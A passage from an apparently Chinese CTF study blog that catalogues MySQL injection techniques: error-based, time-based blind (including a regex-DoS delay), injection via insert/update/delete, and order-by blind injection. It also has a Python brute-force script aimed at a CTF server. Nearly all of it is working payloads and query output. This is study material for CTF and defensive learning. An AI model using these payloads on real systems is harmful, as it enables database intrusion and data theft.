+<p>可以参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43902454/article/details/96495984">基于BIGINT溢出错误的SQL注入</a><br>不过这里有个坑，就是这里<br><img src="20200918235003162.png#pic_center" alt="在这里插入图片描述"><br>如果去查，会发现网上都是说查询成功返回值是0。这是不对的，其实真正的返回值就是你的查询结果。但是进行!操作的时候，实际上存在了类型转换。<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726737.jpeg" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726738.jpeg" alt="在这里插入图片描述"></p>
+<p>因此并不是像网上所说的那样。</p>
+<p>同样的，这题使用bigint报错也不会有那种我们预期的结果，可能也是版本或者玄学的问题。</p>
+<p>NAME_CONST</p>
+<p>利用数据的重复性。<br>使用的姿势：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line">1</span><br><span class="line">?id=1<span class="string">&#x27;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+
+<p>不过这种方式过于鸡肋，因为如果传入NAME_CONST的参数不是常量，就会报错（不是报错注入的那种报错），似乎只有version()可以用</p>
+<p>总结</p>
+<p>报错注入的姿势实在是太多太多，这是一个大的总结：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> floor <span class="operator">+</span> rand <span class="operator">+</span> <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  limit <span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line"><span class="number">2.</span> ExtractValue</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"><span class="number">3.</span> UpdateXml</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"><span class="number">4.</span> Name_Const(<span class="operator">&gt;</span><span class="number">5.0</span><span class="number">.12</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">0</span>),NAME_CONST(version(),<span class="number">0</span>))x;</span><br><span class="line"><span class="number">5.</span> <span class="keyword">Join</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br><span class="line"><span class="number">6.</span> <span class="built_in">exp</span>()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">Exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())a));</span><br><span class="line"><span class="number">7.</span> geometrycollection()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">8.</span> multipoint()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">9.</span> polygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">10.</span> multipolygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">11.</span> linestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">12.</span> multilinestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure>
+
+<p>还有很多方式没有提到</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul>
+<li><strong>sleep()函数</strong></li>
+<li><strong>benchmark函数</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
+
+<p><code>benchmark</code>函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下：<br><a href=""><img src="ZZi7GR.md.png" alt="img"></a></p>
+<p>可以看到通过重复计算延时了<code>1.90s</code></p>
+<ul>
+<li><strong>笛卡尔积盲注</strong></li>
+</ul>
+<p>注入姿势</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>and短路运算规则</code>进行时间盲注。</p>
+<ul>
+<li><strong>GET_LOCK盲注</strong></li>
+</ul>
+<p><code>get_lock</code>函数官方文档中的介绍</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png"><img src="ZZAQbT.md.png" alt="img"></a></p>
+<p>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p>
+<p>此盲注手法有一些限制，就是必须要同时开两个<code>SESSION</code>进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SESSION A</span><br><span class="line">mysql&gt; select get_lock(&#x27;lihuaiqiu&#x27;,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#x27;lihuaiqiu&#x27;,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">SESSION B</span><br><span class="line">mysql&gt; select get_lock(&#x27;lihuaiqiu&#x27;,5);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#x27;lihuaiqiu&#x27;,5) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;0&#x27; and 1=1 and  get_lock(&#x27;lihuaiqiu&#x27;,2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;0&#x27; and 1=0 and  get_lock(&#x27;lihuaiqiu&#x27;,2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>同样的盲注利用手法。</p>
+<ul>
+<li><strong>正则<code>DOS</code> RLIKE注入</strong></li>
+</ul>
+<p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的<code>benchmark</code>注入差不多的。</p>
+<p>利用手法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;s&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure>
+
+<p>报错注入</p>
+<p>正常的报错注入网上一搜是一大把的，所以下面讲的是几个比较的姿势。</p>
+<ul>
+<li><strong>mysql列名重复报错</strong></li>
+</ul>
+<p>在mysql中，mysql列名重复会导致报错，而我们可以通过<code>name_const</code>制造一个列.</p>
+<p>Name_const函数用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1);</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.47 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>报错用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1),name_const(version(),1);;</span><br><span class="line">+--------+--------+</span><br><span class="line">| 5.5.47 | 5.5.47 |</span><br><span class="line">+--------+--------+</span><br><span class="line">|      1 |      1 |</span><br><span class="line">+--------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select name_const(version(),1),name_const(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.5.47&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不过这个有很大的限制，<code>version()</code>所多应的值必须是常量，而我们所需要的<code>database()</code>和<code>user()</code>都是变量，无法通过报错得出，但是我们可以利用这个原理配合join函数得到列名。</p>
+<p>用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test a join ctf_test b;</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| user | pwd          | user | pwd          |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| 1    | 0            | 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 1    | 0            |</span><br><span class="line">| 1    | 0            | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b )x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;user&#x27;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;pwd&#x27;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user,pwd))x;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>xpath语法报错与整数溢出报错的区别</strong></li>
+</ul>
+<p>xpath报错注入中，我们经常用的语法有<code>updatexml</code>和<code>extractvalue</code>函数，同样是报错注入，那么在使用中有什么区别？</p>
+<p>例子：<strong>第12届全国大学生信息安全竞赛全宇宙最简单的SQL</strong></p>
+<p>如果二者的区别认知不太清楚，很可能导致卡在这个点上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(999,999)&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and pow(999,999);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><strong>从上面的实验中可以得出如果在sql语句中有出现语法错误，则会直接报错，不会被and短路运算所影响，如果是大数溢出报错，则会遵循and短路运算规则</strong>。所以可以利用大数溢出这个问题结合前面的1=0的判断条件进行布尔盲注。</p>
+<ul>
+<li><strong>整数溢出报错函数</strong></li>
+</ul>
+<p>pow(),cot(),exp()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and 1=1 and cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;cot(0)&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and 1=1 and pow(988888,999999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(988888,999999)&#x27;</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and 1=1 and exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>利用几何函数进行报错注入</strong></li>
+</ul>
+<p>几何函数进行报错注入，如<code>polygon()</code>,<code>linestring()</code>函数等，姿势如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and polygon(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`test`.`ctf_test`.`user`&#x27; value found during parsing</span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and linestring(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`test`.`ctf_test`.`user`&#x27; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>对于insert,delete,update三种操作的注入</strong></li>
+</ul>
+<p>对于select类型操作其实是最常见，最容易上手的，但insert,delete,update三种操作的注入也很重要，下面是总结的这三种注入的操作姿势。</p>
+<p><strong>报错注入</strong></p>
+<p>insert报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test(`user`,`pwd`) value(&#x27;1&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;2&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>update报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctf_test set user=1 where pwd=&#x27;2&#x27;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>delete报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from ctf_test where user=&#x27;1&#x27;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~test~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>时间盲注</strong></p>
+<p>insert类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into ctf_test(`user`,`pwd`) value(&#x27;1&#x27; and sleep(3) and &#x27;&#x27;,&#x27;2&#x27;);</span><br><span class="line">Query OK, 1 row affected (3.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>delete和update也都是一样的，就不一 一列举了。</p>
+<p>另类注入姿势以及对关键词过滤的绕过</p>
+<ul>
+<li><code>order by</code> 盲注</li>
+</ul>
+<p>题目例子：ISCC web5</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg"><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt="img"></a></p>
+<p><strong>当填入16进制的字符字典序小于flag中对应字母的字典序时，返回的是union插入的字符；当16进制的字符字典序大于flag中的对应字母的字典序时，返回的是flag字段。</strong>此种sql注入手法可以在小括号和列名被过滤时使用。</p>
+<p>web5对应脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://39.100.83.188:8054/&#x27;</span><br><span class="line">headers=&#123;&quot;User-Agent&quot;:&quot;lihuaiqiu Union.373&quot;&#125;</span><br><span class="line">payload=&quot;union_373_Tom&#x27; union select 1,2,0x&#123;&#125; order by 3,2,&#x27;1&quot;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(20):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        data=&#123;&quot;username&quot;:payload.format((flag+chr(j)).encode(&#x27;hex&#x27;)),&quot;password&quot;:&#x27;233&#x27;&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        if &quot;union_373_Tom&quot; in lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j-1)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>MySQL数据库的Innodb引擎的注入</strong></li>
+</ul>
+<p>在对应代码中过滤了information关键字，无法使用<code>information_schema.tables</code>以及<code>information_schema.columns</code>进行查找表和列名。</p>
+<p>此时可以通过innodb引擎进行注入，在Mysql 5.6以上的版本中，在系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p>
+<p>所以可以通过查找这两个表取代information的作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 union select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set, 1 warning (0.00 